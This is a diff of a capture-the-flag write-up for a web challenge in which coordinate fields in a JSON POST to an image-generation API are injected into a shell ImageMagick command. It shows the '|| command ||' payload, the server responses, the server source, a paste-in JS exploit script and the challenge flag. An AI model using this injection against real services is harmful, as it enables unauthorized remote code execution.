@@ -5,26 +5,35 @@ Description:
 ```
 The vanilla msfrog is hard to beat, but this webapp allows you to make it even better!
 ```
-## First look
-The challenge gave us a link to a webpage that looks like this
-![webpage](https://i.imgur.com/MIBxABW.png)
-It is a game where you can add upto 3 items to the canvas and move them around.
+# Table of Contents
+1. [First look](#first-look)
+2. [Looking at the source](#source-look)
+3. [Messing around with the POST request](#post)
+4. [Exploiting the RCE to get the flag](#rce)
+5. [Looking at the server files](#server)
+6. ["get flag" script](#getflag)
+8. [TL;DR](#tldr)
+
+## First look <a name="first-look">
+The challenge gave us a link to a webpage that looks like this\\
+![webpage](https://i.imgur.com/MIBxABW.png)\\
+It is a game where you can add upto 3 items to the canvas and move them around.\\
 Clicking the generate button will download an image of the canvas.
 
-## Looking at the source
+## Looking at the source <a name="source-look">
 Opening the dev tools in chrome, first thing we see in the source is a note in the comments
 ```
  NOTE: There is no (intended) vuln in the frontend, please don't waste your time digging into the JS ;)
 ```
-![note-in-comments](https://i.imgur.com/Ifhe3ig.png)
-So, this means that the intended vulnerability is server-side.
-Looking at the `sources` tab, the file structure ressembles that of a typical React application.
-![sources-tab](https://i.imgur.com/R0V7nVm.png)
-Next 5 minutes I looked at the sources and found that on clicking the `generate` button, the page sends a post request to `/api/generate` with the data of the items placed on the canvas.
-![POST-request](https://i.imgur.com/1SzNwM0.png)
+![note-in-comments](https://i.imgur.com/Ifhe3ig.png)\\
+So, this means that the intended vulnerability is server-side.\\
+Looking at the `sources` tab, the file structure ressembles that of a typical React application.\\
+![sources-tab](https://i.imgur.com/R0V7nVm.png)\\
+Next 5 minutes I looked at the sources and found that on clicking the `generate` button, the page sends a post request to `/api/generate` with the data of the items placed on the canvas.\\
+![POST-request](https://i.imgur.com/1SzNwM0.png)\\
 The server responds with base64 data of the image to be downloaded.
 
-## Messing around with the POST request
+## Messing around with the POST request <a name="post">
 I had a feeling that the contents of the request are passed through shell command, which means there might be RCE, so I created an endpoint on hookbin and tried to curl it.
 ```js
 jsonData=[
@@ -50,8 +59,8 @@ if (response.status !== 200)
 	console.log( `Unexpected response: ${response.status}`);
 response = await response.json();
 ```
-In response, the server sent a string
-![non-existing-img](https://i.imgur.com/JtPxdjE.png)
+In response, the server sent a string\\
+![non-existing-img](https://i.imgur.com/JtPxdjE.png)\\
 So I tried doing it with coordinates
 ```js
 {
@@ -62,7 +71,7 @@ So I tried doing it with coordinates
 	}
 }
 ```
-but it just sent another base64 image data response.
+but it just sent another base64 image data response.\\
 So then I tried using && with coordinates
 ```js
 {
@@ -73,13 +82,13 @@ So then I tried using && with coordinates
 	}
 }
 ```
-This time it responded with the string 
+This time it responded with the string \\
 ```
 Something went wrong :
 b"convert-im6.q16: missing an image filename `+100+100' @ error/convert.c/ConvertImageCommand/3226.\n"
 ```
-Aha! So it uses imagemagick to combine the images.
-The `||` operator in shell executes the next command if the previous command fails.
+Aha! So it uses imagemagick to combine the images.\\
+The `||` operator in shell executes the next command if the previous command fails.\\
 So I replaced `&&` with `||` and also placed `||` at the end
 ```js
 "pos":{
@@ -96,7 +105,7 @@ and the server responded with
 ```
 {"msfrog": "fe\nimg\nserver.py\nwsgi.py\n"}
 ```
-## Exploiting the RCE to get the flag
+## Exploiting the RCE to get the flag <a name="rce">
 Now that we have successfully found a way to execute arbitrary code on the server, all there's left to do is to find where the flag is located.
 I will now list the commands and outputs that led me to the flag.
 
@@ -112,7 +121,7 @@ I will now list the commands and outputs that led me to the flag.
 ```
 {"msfrog": "corctf{sh0uld_h4ve_r3nder3d_cl13nt_s1de_:msfrog:}\n"}
 ```
-### Looking at the server files
+## Looking at the server files
 Now that we have found the flag, why not take a look at the `server.py` file we found in `/app`
 ```py
 import os
@@ -190,7 +199,7 @@ def serve_react(path):
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, threaded=True)
 ```
-### "get flag" script
+## "get flag" script <a name="getflag">
 I am not that great in writing fancy bash scripts, but pasting the following in the js console will get the flag for you ;)
 ```js
 jsonData=[
@@ -213,3 +222,8 @@ let response = await fetch("/api/generate", {
 	body: JSON.stringify(jsonData),
 }).then(r=>r.json()).then(data=>console.log(data.msfrog));
 ```
+## TL;DR <a name="tldr">
+The server uses imagemagick to combine the images and generates base64 data based on the contents of the POST request.\\
+We can achieve RCE by giving `|| <your command> ||` in place of a coordinate.\\
+
+The output flag is `corctf{sh0uld_h4ve_r3nder3d_cl13nt_s1de_:msfrog:}`
